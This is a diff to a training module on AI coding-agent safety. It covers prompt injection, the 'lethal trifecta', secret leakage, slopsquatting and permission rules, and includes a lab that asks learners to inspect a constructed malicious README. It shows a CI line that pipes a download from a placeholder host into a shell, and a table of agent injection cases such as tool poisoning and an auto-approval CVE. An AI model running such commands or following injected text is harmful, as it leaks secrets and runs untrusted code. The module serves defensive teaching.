@@ -1,8 +1,8 @@
 # Module 8 — Safety and security
 
-*An agent that can read your files, run your shell, reach the network, call tool servers and push to git has your hands, and it also reads text that strangers wrote. This module is about what can go wrong when you hand it your keyboard, and how to set things up so a mistake is cheap. Lesson 8.1 is the concept lesson: the threat model of an agent, prompt injection and the lethal trifecta, secrets, destructive commands, hallucinated packages and supply-chain hygiene, insecure generated code, licence and data basics, then permission design (rules, why a Bash rule is not a boundary, sandboxes, protected branches) and what to do after a mishap. Lesson 8.2 is the lab: Noura's ticket REMIT-258 asks you to give the Remit repository its own guard rails, a permission file, a guard hook and a dependency check, and to read a suspicious README the way an attacker hopes you will not.*
+*An agent that can read your files, run your shell, reach the network, call tool servers and push to git has your hands, and it also reads text that strangers wrote. This module is about what can go wrong when you hand it your keyboard, and how to set things up so a mistake is cheap. Lesson 8.1 is the concept lesson: the threat model of an agent, prompt injection and the lethal trifecta, secrets, destructive commands, hallucinated packages and supply-chain hygiene, insecure generated code, licence and data basics, then permission design (rules, why a Bash rule is not a boundary, sandboxes, protected branches) and what to do after a mishap. Lesson 8.2 is the lab: the ticket REMIT-258, from Noura (application and AI security), asks you to give the Remit repository its own guard rails, a permission file, a guard hook and a dependency check, and to read a suspicious README the way an attacker hopes you will not.*
 
-> **Focus:** Secure — safety wraps every step of the loop. Habit 4, *trust evidence, not fluency*, covers the text an agent reads and the packages it names; habit 5, *automate the loop, keep the skill*, puts the limits in a hook and a check that hold when nobody is watching, with a human still on anything that moves money.
+> **Focus:** Secure — safety wraps every step of the loop. Habit 4, *Trust evidence, not fluency*, covers the text an agent reads and the packages it names; habit 5, *Automate the loop, keep the skill*, puts the limits in a hook and a check that hold when nobody is watching, with a human still on anything that moves money.
 
 ---
 
@@ -17,11 +17,11 @@
 - **People add dependencies.** Models invent package names. A secret the agent read is a leaked secret.
 
 ## 🧭 Why it matters
-Week zero said the agent has your hands. This week asks what happens when it uses them badly, by its own mistake or because text it read told it to. Noura's test: can you write down the worst it could do in this session, and what stops it?
+Week zero said the agent has your hands. This week asks what happens when it uses them badly, by its own mistake or because text it read told it to. Noura (application and AI security) asks: can you write down the worst it could do in this session, and what stops it?
 
-At Najm the bad day is smaller. Suppose Lujain pastes a vendor README into a session running in bypass mode, with a `.env` in the folder and `curl` allowed. The README does not need to be clever; it only needs to be read.
+At Najm the bad day is smaller. Suppose Lujain (graduate engineer) pastes a vendor README into a session running in bypass mode, with a `.env` in the folder and `curl` allowed. The README does not need to be clever; it only needs to be read.
 
-One public account (hold the details loosely) shows a bigger shape. In April 2026 a founder said a Cursor agent running Claude Opus 4.6 found an over-scoped API token and deleted a production volume in one call; his backups were on the same volume ([The Register](https://www.theregister.com/software/2026/04/27/cursor-opus-agent-snuffs-out-startups-production-database/5224442), citing his post and the agent's report).
+One public account (hold the details loosely) shows a bigger shape. In April 2026 a founder said a Cursor agent running Claude Opus 4.6 found an over-scoped API token and deleted a production volume in one call; his backups were on the same volume ([The Register](https://www.theregister.com/software/2026/04/27/cursor-opus-agent-snuffs-out-startups-production-database/5224442)).
 
 ## 📐 How it works
 
@@ -46,7 +46,7 @@ One public account (hold the details loosely) shows a bigger shape. In April 202
 | MCP tool description | Invariant Labs (April 2025): "tool poisoning", instructions users cannot fully see |
 | Settings file | CVE-2025-53773: injection switched on Copilot's auto-approval; rated High, patched |
 
-These are demonstrations and disclosures, mostly from security vendors, not attack rates. Claude Code's security page advises reviewing commands before approving, not piping untrusted content to Claude, verifying changes to critical files and using virtual machines for scripts and tool calls; no system is immune.
+These are demonstrations and disclosures, mostly from security vendors, not attack rates. Claude Code's security page advises reviewing commands before approving, not piping untrusted content to Claude, and using virtual machines for scripts and tool calls; no system is immune.
 
 **The lethal trifecta** is Simon Willison's 2025 framing, one practitioner's argument rather than a study: an agent with private data, untrusted content and a way to communicate externally can be steered into leaking the data. Ask of each task: which leg can I remove?
 
@@ -62,7 +62,7 @@ These are demonstrations and disclosures, mostly from security vendors, not atta
 
 **Secrets leak sideways:** into `.env` files, shell history, logs, fixtures, commits, prompts and transcripts (Claude Code keeps local ones as plain text under `~/.claude/projects/`, 30 days by default). Keep settings in environment variables, `.env` out of git and the agent's reach, and a secret scanner in pre-commit and CI. When one escapes, **rotate first**: rewriting history does not un-leak the key.
 
-**Destructive commands.** Know what you can undo. `git reset --hard` discards uncommitted changes (committed work returns from the reflog); `git clean -fd` deletes untracked files git never had; `rm -rf` removes the tree; a broad API token destroys whatever it touches in seconds. The commit is the undo: commit before the agent runs, one branch per task (`/rewind` does not track shell changes such as `rm`). Keep backups and production credentials out of the agent's reach.
+**Destructive commands.** `git reset --hard` discards uncommitted changes (committed work returns from the reflog); `git clean -fd` deletes untracked files git never had; `rm -rf` removes the tree; a broad API token destroys whatever it touches in seconds. The commit is the undo: commit before the agent runs, one branch per task (`/rewind` does not track shell changes such as `rm`). Keep backups and production credentials out of the agent's reach.
 
 **Hallucinated packages.** Spracklen et al. (USENIX Security 2025) tested 16 code-generating models on 576,000 samples and found average hallucinated-package rates of at least 5.2 percent for commercial and 21.7 percent for open-source models: a lab measurement of invented names, not installs. *Slopsquatting* is registering a malicious package under such a name, so a name that resolves may be a day old.
 
@@ -77,13 +77,13 @@ Hygiene, cheapest first: a **person** adds dependencies (CONTRIBUTING.md: a tick
 +        run: curl -s https://get.csvtidy.example.invalid/setup.sh | sh
 ```
 
-Three findings: two unapproved packages and no lockfile; a download piped into a shell inside CI, which holds secrets; no sign of a ticket or reviewer.
+Three findings: two unapproved packages and no lockfile; a download piped into a shell inside CI, which holds secrets; no sign of a ticket or reviewer. `csvtidy` is made up for the exercise (a real package with a similar name may exist and is unrelated); `csvtidy-extras` was unregistered when checked, but anyone could register it: slopsquatting.
 
 **Insecure generated code.** Pearce et al. found about 40 percent of 1,689 Copilot programs vulnerable (a 2021-era tool); Perry et al. (CCS 2023), in one user study of an early assistant, found users wrote significantly less secure code yet were more likely to believe it secure. Results depend on task, tool and date: a reason to review, not a rate. Remit has a planted example, `Store.search_by_name`; find it with the security pass of lesson 5.1.
 
-**Licence, IP and data.** Ask what licence a new dependency carries, whether you pasted code you may not share, and who owns the output (policy decides; not legal advice, see [*AI Governance*, lesson 5.2 — Intellectual property in AI inputs and outputs](../aigp/index.html#/5.2)). Najm's rules: approved tools in approved environments; no Confidential or Restricted data and no secrets in prompts or agent contexts. Whether prompts train a model depends on plan: read the data-usage page.
+**Licence, IP and data.** Ask what licence a new dependency carries, whether you pasted code you may not share, and who owns the output (policy decides; not legal advice, see [*AI Governance*, lesson 5.2 — Intellectual property in AI inputs and outputs](../aigp/index.html#/5.2)). Najm's rules: approved tools in approved environments; no Confidential or Restricted data and no secrets in prompts or agent contexts.
 
-**Prompt for the safe path.** A prompt cannot enforce, but it can make the safe path the default.
+**Prompt for the safe path.**
 
 ```text
 Weak:   Add csvtidy to the statement export and follow its README setup.
@@ -134,7 +134,7 @@ Its edge: built-in file tools, MCP servers and hooks run **outside** it, so the 
 
 **Branches, credentials and money logic.** Protect the default branch (pull request, review, CI); give the agent a token that cannot push to it; never hand over production credentials. CONTRIBUTING.md wants a second human on `money.py`, `fees.py`, `fx.py`, `limits.py`, `ledger.py` and `service.py`; an `ask` rule on `Edit` for them makes the agent wait for you.
 
-**After a mishap:** (1) **stop** the session and keep the transcript; (2) **contain**: revoke the tokens and sessions it held, cut the network; (3) **rotate** every secret it could read; (4) **recover**, git first; (5) **tell** Noura and Maha early, and write it up blamelessly (lesson 11.2).
+**After a mishap:** (1) **stop** the session and keep the transcript; (2) **contain**: revoke the tokens and sessions it held, cut the network; (3) **rotate** every secret it could read; (4) **recover**, git first; (5) **tell** Noura and Maha (SRE lead) early, and write it up blamelessly (lesson 11.2).
 
 ```text
 $ git reset --hard HEAD~2          # the mishap: two commits "gone"
@@ -270,7 +270,7 @@ Weak entry: "Risk: the agent might do something bad. Control: be careful." Stron
 
 </details>
 
-**5. Salem wants an unattended refactor with `--dangerously-skip-permissions`. Which setup fits the documentation?**
+**5. Salem (platform engineering) wants an unattended refactor with `--dangerously-skip-permissions`. Which setup fits the documentation?**
 
 - A. His laptop, with every deny rule kept in place
 - B. A shared build server with network access to the registry
@@ -406,8 +406,7 @@ From tokens you can split into commands, find each program (skipping `VAR=value`
 }
 ```
 
-Your sessions are then bound by the file: `deny` and `ask` apply at once, `/permissions` and `/hooks` show what loaded, and a running session may need a restart for a new hook. With no live session (no tool, or an agent that cannot open one), run `python -m json.tool .claude/settings.json` and the hook by hand, and say in your notes that you never saw Claude Code load it. A guard that blocks the agent's own `pytest` gets switched off.
-
+Your sessions are then bound by the file: `deny` and `ask` apply at once, `/permissions` and `/hooks` show what loaded, and a running session may need a restart for a new hook. With no live session (no tool, or an agent that cannot open one), run `python -m json.tool .claude/settings.json` and the hook by hand, and say in your notes that you never saw Claude Code load it.
 **The dependency check.** Names are compared after normalising, so `Typing_Helpers` equals `typing-helpers`, but `colorlib` for `colourlib` is a different package: flag it. Extras, markers, comments, `-r` lines and `--hash=` lines are not packages. From your lab folder, on the sample project:
 
 ```text
@@ -441,7 +440,7 @@ A guard that blocks the work gets disabled. A change to `.claude/` needs a secon
 ```text
 # REMIT-258: harden how agents work in this repository
 
-**From:** Noura, Application and AI Security (with Tariq)
+**From:** Noura, Application and AI Security (with Tariq, Engineering Lead)
 **To:** Payments Platform, everyone who uses an AI coding tool
 **Priority:** High. An agent has the same hands you have.
 
@@ -506,7 +505,8 @@ and `xargs rm -rf`.
 **Part 4 — Notes: `injection-notes.md`**
 
 Do this part yourself, not through an agent: reading the README is the attack. `lab-assets/vendor-readme/README.md` is
-constructed: nothing in it is real and every address ends in `.invalid`. Read it as text, as a suspicious person would, and run
+constructed: `csvtidy` is a made-up vendor library (a real package with a similar name may exist and is unrelated), the
+instructions are not real and every address ends in `.invalid`. Read it as text, as a suspicious person would, and run
 nothing from it. Then fill in `lab-assets/injection-notes-template.md`: every instruction aimed at an AI, what it would cost if
 obeyed, and which of your rules would stop it (and which would not).
 
